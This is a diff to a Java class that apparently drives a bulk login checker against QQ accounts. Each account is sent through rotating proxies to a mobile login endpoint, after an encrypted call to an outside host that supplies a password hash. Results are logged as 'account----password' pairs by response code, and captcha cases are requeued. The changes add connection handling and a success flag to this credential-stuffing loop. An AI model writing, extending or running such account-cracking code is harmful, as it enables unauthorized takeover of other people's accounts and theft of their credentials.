@@ -136,13 +136,15 @@ public class Task implements Runnable, Observer {
 					CoreConnectionPNames.SO_TIMEOUT,
 					1000 * Integer.parseInt(CONFIGURATION
 							.getProperty("TIMEOUT")));
+			
+			//client.getConnectionManager().closeIdleConnections(4000, TimeUnit.MILLISECONDS);
 
 			byte[] bs = null;
 //			HttpURLConnection connection = null;
 //			OutputStream os = null;
 //			InputStream input = null;
 			DataInputStream in = null;
-			
+			boolean getit = false;
 			try {
 				//URL url = new URL("http://www.y3y4qq.com/gc");
 
@@ -174,11 +176,13 @@ public class Task implements Runnable, Observer {
 				cipher.init(Cipher.ENCRYPT_MODE, pubKey);
 				byte[] encrypted = cipher.doFinal(content.getBytes());
 
-				HttpPost post = new HttpPost("http://www.y3y4qq.com/gc");
+				post = new HttpPost("http://www.y3y4qq.com/gc");
 				
 				post.setHeader("User-Agent", UAG);
 				post.setHeader("Content-Type",
 						"application/x-www-form-urlencoded");
+				post.setHeader("Connection",
+						"close");
 
 				StringBuffer sb = new StringBuffer();
 				sb.append(header);
@@ -192,7 +196,7 @@ public class Task implements Runnable, Observer {
 				
 				in = new DataInputStream(entity.getContent());
 				baos = new ByteArrayOutputStream();
-				byte[] barray = new byte[1024];
+				byte[] barray = new byte[32];
 				int size = -1;
 				while ((size = in.read(barray)) != -1) {
 					baos.write(barray, 0, size);
@@ -223,8 +227,10 @@ public class Task implements Runnable, Observer {
 //				input = connection.getInputStream();
 //				bs = new byte[input.available()];
 //				input.read(bs);
+				getit = true;
 			} catch (Exception e) {
 				e.printStackTrace();
+				getit = false;
 			}finally{
 				if(in!=null){
 					in.close();
@@ -244,79 +250,83 @@ public class Task implements Runnable, Observer {
 					post.abort();
 				}				
 			}
-
-			client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY,
-					proxy);
-			// r = super.defineClass(name, bs, 0, bs.length);
-
-			String ru = "http://pt.3g.qq.com/login?act=json&format=2&bid_code=house_touch&r="
-					+ String.valueOf(RND.nextDouble())
-					+ "&qq="
-					+ account
-					+ "&pmd5="
-					+ new String(bs)
-					+ "&go_url=http%3A%2F%2Fhouse60.3g.qq.com%2Ftouch%2Findex.jsp%3Fsid%3DAd_JZ1k2ZviFLkV2nvFt7005%26g_ut%3D3%26g_f%3D15124";
-			request = new HttpGet(ru);
-			request.setHeader("User-Agent", UAG);//
-
-			// try{
-			// Thread.sleep(200);
-			// }catch(Exception e){
-			// return;
-			// }
-
-			// if(!run){
-			if (!Engine.getInstance().canRun()) {
-				return;
-			}
-
-			Engine.getInstance().info(
-					account + " -> " + proxy.getHostName() + ":"
-							+ proxy.getPort());
-			response = client.execute(request);
-			entity = response.getEntity();
-			resp = EntityUtils.toString(entity);
-
-			/**
-			 * Class<?> clazz = null; clazz = new
-			 * HoylandClassLoader().loadClass("ws.hoyland.sm.Dynamicer",
-			 * account, password); resp = (String)(clazz.getMethod("excute", new
-			 * Class[] { DefaultHttpClient.class}).invoke(null, new
-			 * Object[]{client}));
-			 **/
-
-			if (resp.indexOf("pt.handleLoginResult") == -1)// 代理异常
-			{
-				// System.out.println("A2");
-				// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
-			} else {
-				// System.out.println("A3");
-				// bool ok = false;
-				if (resp.indexOf("," + account + ",0,") != -1) {
-					Engine.getInstance().log(0, account + "----" + password);// account
-																				// +
-																				// " / "
-																				// +
-																				// proxy
-					// task.Abort();
-				} else if (resp.indexOf(",0,40010,") != -1) {
-					Engine.getInstance().log(1, account + "----" + password);
-					// task.Abort();
-				} else if (resp.indexOf(",0,40026,") != -1) {
-					Engine.getInstance().log(2, account + "----" + password);
-					// task.Abort();
-				} else if (resp.indexOf("," + account + ",0,") != -1)// 验证码
+			
+			if(getit){
+				
+				client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY,
+						proxy);
+				// r = super.defineClass(name, bs, 0, bs.length);
+	
+				String ru = "http://pt.3g.qq.com/login?act=json&format=2&bid_code=house_touch&r="
+						+ String.valueOf(RND.nextDouble())
+						+ "&qq="
+						+ account
+						+ "&pmd5="
+						+ new String(bs)
+						+ "&go_url=http%3A%2F%2Fhouse60.3g.qq.com%2Ftouch%2Findex.jsp%3Fsid%3DAd_JZ1k2ZviFLkV2nvFt7005%26g_ut%3D3%26g_f%3D15124";
+				request = new HttpGet(ru);
+				request.setHeader("User-Agent", UAG);//
+				request.setHeader("Connection", "close");//
+	
+				// try{
+				// Thread.sleep(200);
+				// }catch(Exception e){
+				// return;
+				// }
+	
+				// if(!run){
+				if (!Engine.getInstance().canRun()) {
+					return;
+				}
+	
+				Engine.getInstance().info(
+						account + " -> " + proxy.getHostName() + ":"
+								+ proxy.getPort());
+				response = client.execute(request);
+				entity = response.getEntity();
+				resp = EntityUtils.toString(entity);
+	
+				/**
+				 * Class<?> clazz = null; clazz = new
+				 * HoylandClassLoader().loadClass("ws.hoyland.sm.Dynamicer",
+				 * account, password); resp = (String)(clazz.getMethod("excute", new
+				 * Class[] { DefaultHttpClient.class}).invoke(null, new
+				 * Object[]{client}));
+				 **/
+	
+				if (resp.indexOf("pt.handleLoginResult") == -1)// 代理异常
 				{
-					Engine.getInstance().addTask(line);
-
-					// 不离开当前任务
-					// Thread.Sleep(1000 *
-					// Int32.Parse(cfa.AppSettings.Settings["P_ITV"].Value));//N秒后继续
-				} else // 代理异常
-				{
-					// System.out.println("A4");
-					// System.out.println("proxy="+proxy);
+					// System.out.println("A2");
 					// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
+				} else {
+					// System.out.println("A3");
+					// bool ok = false;
+					if (resp.indexOf("," + account + ",0,") != -1) {
+						Engine.getInstance().log(0, account + "----" + password);// account
+																					// +
+																					// " / "
+																					// +
+																					// proxy
+						// task.Abort();
+					} else if (resp.indexOf(",0,40010,") != -1) {
+						Engine.getInstance().log(1, account + "----" + password);
+						// task.Abort();
+					} else if (resp.indexOf(",0,40026,") != -1) {
+						Engine.getInstance().log(2, account + "----" + password);
+						// task.Abort();
+					} else if (resp.indexOf("," + account + ",0,") != -1)// 验证码
+					{
+						Engine.getInstance().addTask(line);
+	
+						// 不离开当前任务
+						// Thread.Sleep(1000 *
+						// Int32.Parse(cfa.AppSettings.Settings["P_ITV"].Value));//N秒后继续
+					} else // 代理异常
+					{
+						// System.out.println("A4");
+						// System.out.println("proxy="+proxy);
+						// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
+					}
 				}
 			}
 		}
@@ -348,6 +358,10 @@ public class Task implements Runnable, Observer {
 			if (request != null) {
 				request.releaseConnection();
 				request.abort();
+			}
+
+			if(client!=null){
+				client.getConnectionManager().shutdown();
 			}
 		}
 
